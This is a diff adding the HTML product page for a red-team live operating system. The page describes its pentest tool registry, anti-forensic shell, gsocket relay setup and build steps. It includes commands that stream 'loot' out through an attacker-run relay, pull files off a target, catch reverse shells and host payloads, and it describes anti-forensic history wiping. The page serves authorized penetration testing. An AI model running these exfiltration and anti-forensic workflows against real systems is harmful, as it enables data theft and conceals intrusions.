@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>COBRA OS — Minimal Hardened Red Team Live OS</title>
+<meta name="description" content="COBRA OS is a minimal, hardened, console-only red team live OS: Debian trixie minbase + Parrot OS tools, an anti-forensic operator shell, and a curated command registry. No GUI. No telemetry. For authorized engagements only.">
+<meta property="og:title" content="COBRA OS — Minimal Hardened Red Team Live OS">
+<meta property="og:description" content="Console-only red team live OS. Debian minbase + Parrot tools. No X, no telemetry, default-deny everything.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://cobra-os.com/">
+<meta property="og:image" content="https://cobra-os.com/assets/img/cobra-logo.png">
+<meta name="theme-color" content="#050508">
+<link rel="icon" type="image/png" href="assets/img/cobra-logo.png">
+<link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+
+<!-- ======================= NAV ======================= -->
+<header class="nav" id="top">
+  <div class="nav-inner">
+    <a class="nav-brand" href="#top">
+      <img src="assets/img/cobra-logo.png" alt="COBRA OS logo" class="nav-logo">
+      <span class="nav-title">COBRA<span class="red">_OS</span></span>
+    </a>
+    <nav class="nav-links" id="navLinks" aria-label="Primary">
+      <a href="#overview">overview</a>
+      <a href="#features">features</a>
+      <a href="#ops">ops</a>
+      <a href="#relay">relay</a>
+      <a href="#profiles">profiles</a>
+      <a href="#build">build</a>
+      <a href="#download" class="nav-cta">download</a>
+    </nav>
+    <button class="nav-burger" id="navBurger" aria-label="Toggle navigation" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</header>
+
+<main>
+
+<!-- ======================= HERO ======================= -->
+<section class="hero">
+  <div class="hero-grid container">
+    <div class="hero-copy">
+      <p class="hero-kicker"><span class="prompt">operator@cobra:~$</span> ./boot --live</p>
+      <h1>COBRA <span class="red">OS</span></h1>
+      <p class="hero-tag">A minimal, hardened <strong>red team live OS</strong>. Console-only by design —
+      no X server, no display manager, no GUI. tmux is the dashboard, <code>links2</code> over Tor is the
+      browser, and every byte in the image earns its place.</p>
+      <div class="hero-ctas">
+        <a href="#download" class="btn btn-red">[ download the iso ]</a>
+        <a href="#build" class="btn btn-ghost">$ build from source</a>
+      </div>
+      <ul class="hero-stats">
+        <li><span class="stat-num cyan">2.4&nbsp;GiB</span><span class="stat-label">iso-hybrid image</span></li>
+        <li><span class="stat-num cyan">0</span><span class="stat-label">GUI packages</span></li>
+        <li><span class="stat-num cyan">0</span><span class="stat-label">telemetry, ever</span></li>
+        <li><span class="stat-num cyan">1</span><span class="stat-label">source of truth</span></li>
+      </ul>
+    </div>
+
+    <div class="hero-term">
+      <div class="term">
+        <div class="term-bar">
+          <span class="term-dot d-red"></span><span class="term-dot d-amber"></span><span class="term-dot d-green"></span>
+          <span class="term-title">/dev/tty1 — cobra live</span>
+        </div>
+        <pre class="term-body" id="heroTerm" aria-label="Simulated COBRA OS terminal session"></pre>
+        <noscript>
+        <pre class="term-body">
+<span class="t-red">   ____   ___   ____   ____       _       ___   ____  </span>
+<span class="t-red">  / ___| / _ \ | __ ) |  _ \     / \     / _ \ / ___| </span>
+<span class="t-red"> | |    | | | ||  _ \ | |_) |   / _ \   | | | |\___ \ </span>
+<span class="t-red"> | |___ | |_| || |_) ||  _ <   / ___ \  | |_| |___) |</span>
+<span class="t-red">  \____| \___/ |____/ |_| \_\ /_/   \_\  \___/|____/ </span>
+<span class="t-cyan">  minimal · hardened · console-only — red team live OS</span>
+
+<span class="t-green">operator@cobra</span>:<span class="t-blue">~</span>$ opshelp
+COBRA operator commands (cobra-ops)
+  recon    fscan portscan svcscan vulnscan udpscan dnsq whois smbenum
+  web      webdir webvuln sql
+  creds    brute crack hashcrack
+  intel    sploit privesc
+  capture  sniff pcap listen serve
+  payload  egg upserv
+  dash     mon files web
+
+<span class="t-green">operator@cobra</span>:<span class="t-blue">~</span>$ <span class="t-dim">_</span></pre>
+        </noscript>
+      </div>
+    </div>
+  </div>
+  <div class="hero-fade" aria-hidden="true"></div>
+</section>
+
+<!-- ======================= OVERVIEW ======================= -->
+<section id="overview" class="section">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">01</span> <span class="red">></span> what it is</h2>
+    <div class="overview-grid">
+      <div class="overview-copy">
+        <p class="lede">COBRA OS is a <strong>live operating system scaffold for authorized penetration
+        testing</strong>: a Debian <code>trixie</code> <code>minbase</code> core, a tool feed from the Parrot OS
+        repositories, a rebranded operator shell forked from THC's hackshell, and a curated operator
+        command registry — all wrapped in a red-team cyberpunk console theme.</p>
+        <p>It is deliberately <strong>console-only</strong>. There is no X server, no Wayland, no display
+        manager and no GUI packages anywhere in the image. tmux splits are the dashboard. Web access is a
+        text browser summoned deliberately, over gated connections, optionally wrapped in Tor. The result
+        is a small, auditable attack surface that boots from USB and leaves nothing behind.</p>
+        <p>One script — <code>chroot-setup.sh</code> — is the single source of truth for the toolset and the
+        hardening. It builds both the chroot rootfs and the live ISO, so the system you test is the system
+        you ship.</p>
+        <div class="callout callout-amber">
+          <strong>scaffold, not a finished distro.</strong> Treat every default — password, tool list,
+          firewall rules — as something to review before it touches a network you care about.
+        </div>
+      </div>
+      <aside class="overview-card">
+        <h3 class="card-title">// base layers</h3>
+        <ul class="layer-list">
+          <li><span class="layer-k">base</span><span class="layer-v">Debian trixie <code>--variant=minbase</code></span></li>
+          <li><span class="layer-k">tools</span><span class="layer-v">Parrot OS repo (rolling <code>parrot</code> suite)</span></li>
+          <li><span class="layer-k">shell</span><span class="layer-v">cobrashell — THC hackshell fork, de-THC'd</span></li>
+          <li><span class="layer-k">registry</span><span class="layer-v">cobra-ops — the retired TUI as bash functions</span></li>
+          <li><span class="layer-k">dashboard</span><span class="layer-v">tmux splits & tabs — nothing else</span></li>
+          <li><span class="layer-k">browser</span><span class="layer-v">links2, xint-gated, <code>torify</code>-able</span></li>
+          <li><span class="layer-k">theme</span><span class="layer-v">VGA palette remap — zero packages, zero X</span></li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= FEATURES ======================= -->
+<section id="features" class="section section-alt">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">02</span> <span class="red">></span> capabilities</h2>
+    <div class="feature-grid">
+
+      <article class="feature-card">
+        <div class="feature-icon red">▲</div>
+        <h3>Console-only, on purpose</h3>
+        <p>No X11, no Wayland, no DM, no GUI toolkits — the brief X11 experiment was tried and reverted.
+        A TTY is all you get, and all you need. Smaller image, smaller attack surface, nothing to phish.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">✕</div>
+        <h3>Anti-forensic shell</h3>
+        <p>No history anywhere (bash, less, mysql, psql, sqlite, redis), <code>XHOME</code> in
+        <code>/dev/shm</code> that auto-destructs on exit, and a tmux that hides on a socket
+        <code>tmux ls</code> will never show.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">■</div>
+        <h3>Default-deny firewall</h3>
+        <p>nftables drops inbound and forwarded traffic by default; loopback and established sessions pass,
+        ICMPv4/v6 stay alive. Inbound listeners punch deliberate, runtime-only holes.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">●</div>
+        <h3>Gated internet</h3>
+        <p>Nothing touches the network by accident. Every internet-bound helper — downloads, exfil,
+        recon lookups, the browser — sits behind cobrashell's <code>xint</code> gate. Loopback stays open
+        for local listeners.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">◆</div>
+        <h3>Tor-ready</h3>
+        <p>System tor daemon with SOCKS on <code>127.0.0.1:9050</code>, <code>torsocks</code> for
+        <code>torify links2</code>, <code>proxychains4</code> for everything else, and
+        <code>proxy 9050</code> to export socks5h env vars for curl & co.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">⬡</div>
+        <h3>De-THC'd, zero telemetry</h3>
+        <p>The hackshell fork was fully audited: upstream's recon calls to <code>ip.thc.org</code> are
+        ripped out — engagement targets never leak to third-party infrastructure. Point them at your own
+        relay with <code>COBRA_RECON_HOST</code> / <code>GS_HOST</code>.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">▣</div>
+        <h3>LUKS persistence</h3>
+        <p>Live-boot with <code>noswap persistence</code> on the cmdline: pair the USB with an encrypted
+        persistence partition and live-boot unlocks it at boot. RAM-only semantics stay the default.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">≡</div>
+        <h3>One source of truth</h3>
+        <p><code>chroot-setup.sh</code> runs inside the debootstrap chroot <em>and</em> as the live-build
+        hook — one toolset, one hardening pass, two outputs: <code>./rootfs/</code> and
+        <code>cobra-os-&lt;date&gt;.iso</code>.</p>
+      </article>
+
+      <article class="feature-card">
+        <div class="feature-icon red">✦</div>
+        <h3>Themed boot-to-shell</h3>
+        <p>Cobra splash on the BIOS and UEFI boot menus, a red ASCII banner on the login prompt, a remapped
+        16-color VGA console palette, themed <code>LS_COLORS</code>, grep and man pages — all escape
+        sequences, zero packages.</p>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ======================= OPS REGISTRY ======================= -->
+<section id="ops" class="section">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">03</span> <span class="red">></span> the operator registry</h2>
+    <p class="sec-lede">Every interactive shell sources <code>cobra-ops.sh</code> — the retired Textual TUI's
+    command set, ported to bash. <code>opshelp</code> lists it in-session. Every function maps 1:1 to a
+    package in <code>chroot-setup.sh</code> and a row in the build plan.</p>
+
+    <div class="ops-table-wrap">
+      <table class="ops-table">
+        <thead>
+          <tr><th>category</th><th>command</th><th>what it runs</th><th>purpose</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="ops-cat" rowspan="8">recon</td>
+              <td><code>target &lt;host&gt;</code></td><td class="dim">— shell state —</td><td>set the active target (fallback for recon cmds)</td></tr>
+          <tr><td><code>fscan &lt;t&gt;</code></td><td class="dim">nmap -T4 -F</td><td>fast scan, top 1000 ports</td></tr>
+          <tr><td><code>portscan &lt;t&gt;</code></td><td class="dim">nmap -p- -T4</td><td>full TCP scan</td></tr>
+          <tr><td><code>svcscan &lt;t&gt;</code></td><td class="dim">nmap -sV -sC -T4</td><td>service/version + default scripts</td></tr>
+          <tr><td><code>vulnscan &lt;t&gt;</code></td><td class="dim">nmap --script vuln</td><td>vuln scripts (slow, noisy)</td></tr>
+          <tr><td><code>udpscan &lt;t&gt;</code></td><td class="dim">nmap -sU --top-ports 100</td><td>top 100 UDP ports (sudo)</td></tr>
+          <tr><td><code>dnsq</code> / <code>whois</code></td><td class="dim">dig / whois</td><td>DNS records & whois lookups</td></tr>
+          <tr><td><code>smbenum &lt;t&gt;</code></td><td class="dim">enum4linux-ng -A</td><td>SMB/Windows shares, users, policy</td></tr>
+
+          <tr><td class="ops-cat" rowspan="3">web</td>
+              <td><code>webdir &lt;url&gt;</code></td><td class="dim">gobuster dir</td><td>directory brute-force (dirb common.txt)</td></tr>
+          <tr><td><code>webvuln &lt;url&gt;</code></td><td class="dim">nikto -h</td><td>web server scan</td></tr>
+          <tr><td><code>sql &lt;url&gt;</code></td><td class="dim">sqlmap --batch</td><td>SQL injection, randomized agent</td></tr>
+
+          <tr><td class="ops-cat" rowspan="3">creds</td>
+              <td><code>brute &lt;h&gt; &lt;s&gt; &lt;u&gt;</code></td><td class="dim">hydra + rockyou</td><td>service brute-force</td></tr>
+          <tr><td><code>crack &lt;hashfile&gt;</code></td><td class="dim">john + rockyou</td><td>hash cracking</td></tr>
+          <tr><td><code>hashcrack &lt;m&gt; &lt;f&gt;</code></td><td class="dim">hashcat -m</td><td>GPU/hash-mode cracking</td></tr>
+
+          <tr><td class="ops-cat" rowspan="2">intel</td>
+              <td><code>sploit &lt;term&gt;</code></td><td class="dim">searchsploit</td><td>offline exploit-db lookup (CSV on disk)</td></tr>
+          <tr><td><code>privesc [flags]</code></td><td class="dim">vendored linpeas</td><td>privesc paths on THIS box — local, no network</td></tr>
+
+          <tr><td class="ops-cat" rowspan="4">capture</td>
+              <td><code>sniff [iface]</code></td><td class="dim">tcpdump -nn -l</td><td>live capture</td></tr>
+          <tr><td><code>pcap [iface]</code></td><td class="dim">tshark -l</td><td>live decode</td></tr>
+          <tr><td><code>listen &lt;port&gt;</code></td><td class="dim">nc -lvnp</td><td>reverse-shell catcher</td></tr>
+          <tr><td><code>serve [port]</code></td><td class="dim">python3 http.server</td><td>payload hosting</td></tr>
+
+          <tr><td class="ops-cat" rowspan="2">payload</td>
+              <td><code>egg</code></td><td class="dim">mkegg.sh wizard</td><td>self-extracting payload packer</td></tr>
+          <tr><td><code>upserv</code></td><td class="dim">php upload server</td><td>loot-drop receiver (webplus profile)</td></tr>
+
+          <tr><td class="ops-cat" rowspan="3">dash</td>
+              <td><code>mon</code></td><td class="dim">btop</td><td>system monitor</td></tr>
+          <tr><td><code>files</code></td><td class="dim">nnn</td><td>console file manager</td></tr>
+          <tr><td><code>web [url]</code></td><td class="dim">links2</td><td>text browser — xint-gated, Tor via <code>torify</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="cobrashell-strip">
+      <h3 class="strip-title">+ cobrashell, underneath</h3>
+      <p>The registry rides on top of <strong>cobrashell</strong> (THC hackshell fork):
+      <code>loot</code>/<code>lootmore</code> for target situational awareness, <code>scan</code>,
+      <code>xssh</code>, <code>bounce</code>, <code>ghostip</code>, <code>hide</code>,
+      <code>memexec</code>, <code>enc</code>/<code>dec</code>, <code>xtmux</code> on a hidden socket,
+      paste-site exfil via <code>transfer</code>/<code>tb</code>, and the <code>gs-*</code> gsocket
+       toolset — every internet-bound one gated behind <code>xint</code>. The gsocket tools honor
+       <code>GS_HOST</code>/<code>GS_PORT</code>: point them at <a href="#relay">your own relay</a>,
+       not someone else's.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= RELAY ======================= -->
+<section id="relay" class="section section-alt">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">04</span> <span class="red">></span> your own relay — gsocket, self-hosted</h2>
+    <p class="sec-lede">cobrashell's <code>gs-*</code> toolset (gs-netcat, gs-sftp, gs-exfil) rendezvous
+    through the Global Socket Relay Network by default. COBRA OS is de-THC'd — nothing calls home to
+    THC infrastructure — and for full independence you point the tools at a relay you own: the
+    <a href="https://github.com/hackerschoice/gsocket">hackerschoice/gsocket</a> project ships the
+    relay daemon.</p>
+    <div class="build-grid">
+      <div class="build-step">
+        <h3><span class="step-num">1</span> run the relay</h3>
+        <pre class="codeblock"><code><span class="t-dim"># on a VPS you control (e.g. relay.cobra-os.com)</span>
+<span class="t-dim"># docker — the published relay image:</span>
+docker run -d --restart unless-stopped \
+    -p 7350:7350 hackerschoice/gsocket-relay
+
+<span class="t-dim"># or the relay daemon from the gsocket repo:</span>
+gsocket -s          <span class="t-dim"># listens on TCP/7350</span></code></pre>
+        <p>One TCP port; both ends connect <em>outbound</em> to the relay, so NAT and the
+        default-deny firewall are never a problem. Streams are end-to-end encrypted (SRP) — the
+        relay only ever sees ciphertext. Deploy notes & hardening: the gsocket repo.</p>
+      </div>
+      <div class="build-step">
+        <h3><span class="step-num">2</span> point COBRA OS at it</h3>
+        <pre class="codeblock"><code><span class="t-dim"># in the operator shell, before any gs-* work:</span>
+export GS_HOST=relay.cobra-os.com
+export GS_PORT=7350
+xint
+
+<span class="t-dim"># everything gsocket now rides YOUR relay:</span>
+gs-sftp-server            <span class="t-dim"># browse/pull files off a target</span>
+gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
+<span class="t-dim"># the egg wizard's gs-netcat beacon mode threads</span>
+<span class="t-dim"># GS_HOST/GS_PORT into the payload too</span></code></pre>
+        <p>Same pattern for recon: <code>COBRA_RECON_HOST</code> points cobrashell's
+        <code>sub</code>/<code>ptr</code> at your own recon service (upstream's
+        <code>ip.thc.org</code> calls are ripped out). All of it stays behind the
+        <code>xint</code> gate.</p>
+      </div>
+    </div>
+    <div class="callout callout-amber">
+      <strong>why bother:</strong> the gsocket stream is end-to-end encrypted on any relay — but
+      your own relay also keeps connection metadata (timing, volume, pairings) on infrastructure
+      you control, and a burned public relay can never take your access with it.
+    </div>
+  </div>
+</section>
+
+<!-- ======================= PROFILES ======================= -->
+<section id="profiles" class="section">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">05</span> <span class="red">></span> build profiles</h2>
+    <p class="sec-lede">The core stays narrow. Extras ride in as space-separated
+    <code>COBRA_PROFILES</code> at build time — each one a case in <code>chroot-setup.sh</code>, never
+    part of the core list.</p>
+    <div class="profile-grid">
+      <article class="profile-card">
+        <h3><span class="red">[</span> wireless <span class="red">]</span></h3>
+        <p class="profile-pkgs">bettercap · hcxtools · hcxdumptool · reaver · bully · kismet</p>
+        <p>802.11 auditing beyond the aircrack-ng base — every UI a console citizen.</p>
+      </article>
+      <article class="profile-card">
+        <h3><span class="red">[</span> ad <span class="red">]</span></h3>
+        <p class="profile-pkgs">impacket · responder · netexec · bloodhound.py</p>
+        <p>Active Directory & Windows ops: coercion, relaying, enumeration, collection.</p>
+      </article>
+      <article class="profile-card">
+        <h3><span class="red">[</span> exploit <span class="red">]</span></h3>
+        <p class="profile-pkgs">metasploit-framework</p>
+        <p>msfconsole is a TTY native. The local exploit-db archive (searchsploit →
+        <code>sploit</code>) is core since 2026-08-17 — this profile is just the framework.</p>
+      </article>
+      <article class="profile-card">
+        <h3><span class="red">[</span> webplus <span class="red">]</span></h3>
+        <p class="profile-pkgs">mitmproxy · ffuf · seclists · wpscan · php-cli</p>
+        <p>Heavier web tooling. mitmproxy replaces Burp (Java GUIs are dead weight without X);
+        php-cli powers the <code>upserv</code> loot-drop server.</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= HARDENING ======================= -->
+<section id="hardening" class="section">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">06</span> <span class="red">></span> hardened by default</h2>
+    <div class="harden-grid">
+      <ul class="harden-list">
+        <li><span class="h-k">root</span> locked (<code>passwd -l</code>) — sudo-only via the <code>operator</code> user, password change forced on first login</li>
+        <li><span class="h-k">nftables</span> default-deny input/forward; loopback + established allowed; ICMPv4/v6 kept alive (NDP needs it)</li>
+        <li><span class="h-k">sysctl</span> kptr/dmesg/BPF/kexec restrictions, <code>fs.protected_*</code>, IPv4/IPv6 sanity, <code>ip_forward=0</code></li>
+        <li><span class="h-k">modprobe</span> usb-storage off by default; legacy protocols & filesystems blacklisted</li>
+      </ul>
+      <ul class="harden-list">
+        <li><span class="h-k">history</span> to <code>/dev/null</code> for bash/less/mysql/psql/sqlite/redis — plus cobrashell's RAM-only <code>XHOME</code></li>
+        <li><span class="h-k">MAC</span> random Wi-Fi MAC per connection, stable ethernet MAC (NetworkManager)</li>
+        <li><span class="h-k">apt</span> no .deb cache in images; docs/man/info stripped; apt lists dropped</li>
+        <li><span class="h-k">purge</span> retired TUI artifacts and the whole X11/GUI package set are purged from warm chroots on rebuild</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= BUILD ======================= -->
+<section id="build" class="section section-alt">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">07</span> <span class="red">></span> build it yourself</h2>
+    <p class="sec-lede">Two host-side scripts do everything. debootstrap wants root, so run them on a
+    Debian/Ubuntu host or VM.</p>
+    <div class="build-grid">
+      <div class="build-step">
+        <h3><span class="step-num">1</span> rootfs</h3>
+        <pre class="codeblock"><code><span class="t-dim"># core toolset</span>
+sudo apt install debootstrap
+sudo ./build-rootfs.sh
+
+<span class="t-dim"># with extras</span>
+sudo COBRA_PROFILES="wireless exploit" ./build-rootfs.sh
+
+<span class="t-dim"># resume on a warm rootfs</span>
+sudo SKIP_DEBOOTSTRAP=1 ./build-rootfs.sh</code></pre>
+        <p>Produces <code>./rootfs/</code>: minimal Debian base + Parrot repo, the curated core tool set,
+        locked root, the <code>operator</code> sudo user, default-deny nftables, sysctl/modprobe
+        hardening, MAC randomization, history-off defaults.</p>
+      </div>
+      <div class="build-step">
+        <h3><span class="step-num">2</span> live iso</h3>
+        <pre class="codeblock"><code><span class="t-dim"># core toolset ISO</span>
+sudo apt install live-build
+sudo ./build-iso.sh
+
+<span class="t-dim"># with extras</span>
+sudo COBRA_PROFILES="wireless" ./build-iso.sh
+
+<span class="t-dim"># smoke test</span>
+qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
+        <p>Produces <code>cobra-os-&lt;date&gt;.iso</code> (+ <code>.sha256</code>): iso-hybrid for BIOS
+        <em>and</em> UEFI, live-boot with <code>noswap persistence</code>, LUKS persistence unlock via
+        cryptsetup, themed boot menus. <code>toram</code> stays a deliberate TAB-edit at the boot menu.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= DOWNLOAD ======================= -->
+<section id="download" class="section">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">08</span> <span class="red">></span> get the build</h2>
+    <div class="dl-grid">
+      <div class="dl-card">
+        <h3 class="dl-title">cobra-os-20260816.iso</h3>
+        <ul class="dl-meta">
+          <li><span>size</span><strong>2.4 GiB</strong></li>
+          <li><span>format</span><strong>iso-hybrid (BIOS + UEFI)</strong></li>
+          <li><span>base</span><strong>Debian trixie minbase + Parrot (echo)</strong></li>
+          <li><span>boot</span><strong>live-boot · noswap · persistence</strong></li>
+          <li><span>login</span><strong>operator / changeme — forced change on first login</strong></li>
+        </ul>
+        <div class="dl-actions">
+          <a class="btn btn-red" href="https://dl.cobra-os.com/cobra-os-20260816.iso">download iso</a>
+          <a class="btn btn-ghost" href="downloads/cobra-os-20260816.iso.sha256" download>sha256</a>
+        </div>
+        <p class="dl-note">Hosted on Cloudflare R2 at <code>dl.cobra-os.com</code> — Pages caps files at
+        25&nbsp;MiB and GitHub Releases at 2&nbsp;GiB, so the 2.4&nbsp;GiB ISO ships from the bucket.
+        The <code>.sha256</code> is mirrored there and versioned here in <code>downloads/</code>.
+        New builds: <code>website/release.sh</code> + <code>rclone</code> (see
+        <code>website/README.md</code>).</p>
+      </div>
+      <div class="dl-verify">
+        <h3>verify, then write</h3>
+        <pre class="codeblock"><code><span class="t-dim"># verify the image</span>
+sha256sum -c cobra-os-20260816.iso.sha256
+
+<span class="t-dim"># expected:</span>
+<span class="t-green">cobra-os-20260816.iso: OK</span>
+
+<span class="t-dim"># write to USB (replace sdX — careful)</span>
+sudo dd if=cobra-os-20260816.iso of=/dev/sdX \
+    bs=4M status=progress oflag=sync
+
+<span class="t-dim"># or smoke-test in a VM first</span>
+qemu-system-x86_64 -m 2G -cdrom cobra-os-20260816.iso</code></pre>
+        <div class="callout callout-red">
+          <strong>change before deploying:</strong> the <code>changeme</code> operator password is a
+          documented scaffold default. Review the tool list, <code>PARROT_SUITE</code>, and the nftables
+          input rules for your op.
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= THEME ======================= -->
+<section id="theme" class="section section-alt">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">09</span> <span class="red">></span> the cobra palette</h2>
+    <p class="sec-lede">Red-team cyberpunk with zero packages and zero X — the same ramp that themes the
+    boot menu, the login banner, the console, and this page.</p>
+    <div class="palette">
+      <div class="swatch" style="--sw:#050508"><span class="sw-name">void</span><span class="sw-hex">#050508</span></div>
+      <div class="swatch" style="--sw:#d6dbe2"><span class="sw-name">steel</span><span class="sw-hex">#d6dbe2</span></div>
+      <div class="swatch" style="--sw:#ff2a3c"><span class="sw-name">neon red</span><span class="sw-hex">#ff2a3c</span></div>
+      <div class="swatch" style="--sw:#3dff8f"><span class="sw-name">phosphor</span><span class="sw-hex">#3dff8f</span></div>
+      <div class="swatch" style="--sw:#ffb84d"><span class="sw-name">amber</span><span class="sw-hex">#ffb84d</span></div>
+      <div class="swatch" style="--sw:#4d7cff"><span class="sw-name">electric</span><span class="sw-hex">#4d7cff</span></div>
+      <div class="swatch" style="--sw:#c95cff"><span class="sw-name">violet</span><span class="sw-hex">#c95cff</span></div>
+      <div class="swatch" style="--sw:#2ee6e6"><span class="sw-name">cyan</span><span class="sw-hex">#2ee6e6</span></div>
+      <div class="swatch" style="--sw:#3a3f4a"><span class="sw-name">gunmetal</span><span class="sw-hex">#3a3f4a</span></div>
+    </div>
+    <div class="splash-showcase">
+      <img src="assets/img/splash.png" alt="COBRA OS boot splash — cobra on black, vesamenu-safe" loading="lazy">
+      <p class="splash-caption">the actual boot splash — <code>splash.png</code>, flattened for vesamenu, backing both the isolinux (BIOS) and GRUB (UEFI) menus.</p>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<!-- ======================= FOOTER ======================= -->
+<footer class="footer">
+  <div class="container footer-grid">
+    <div class="footer-brand">
+      <img src="assets/img/cobra-logo.png" alt="" class="footer-logo">
+      <p class="footer-line">COBRA OS — minimal · hardened · console-only.</p>
+      <p class="footer-dim">Debian trixie minbase · Parrot OS tool feed · cobrashell (THC hackshell fork) · cobra-ops registry.</p>
+    </div>
+    <div class="footer-col">
+      <h4>site</h4>
+      <a href="#overview">overview</a>
+      <a href="#features">features</a>
+      <a href="#ops">ops registry</a>
+      <a href="#relay">relay</a>
+      <a href="#build">build</a>
+      <a href="#download">download</a>
+    </div>
+    <div class="footer-col">
+      <h4>in the repo</h4>
+      <span>build-rootfs.sh</span>
+      <span>chroot-setup.sh</span>
+      <span>build-iso.sh</span>
+      <span>shell/cobrashell.sh</span>
+      <span>BUILD_PLAN.md</span>
+      <span>website/release.sh</span>
+    </div>
+  </div>
+  <div class="container footer-legal">
+    <p><strong>For authorized penetration testing only.</strong> COBRA OS is built for consented,
+    contracted security work. You are responsible for how you use it.</p>
+    <p class="footer-dim">© 2026 COBRA OS · cobra-os.com · no analytics, no cookies, no phone-home — like the OS.</p>
+  </div>
+</footer>
+
+<script src="assets/js/main.js" defer></script>
+</body>
+</html>
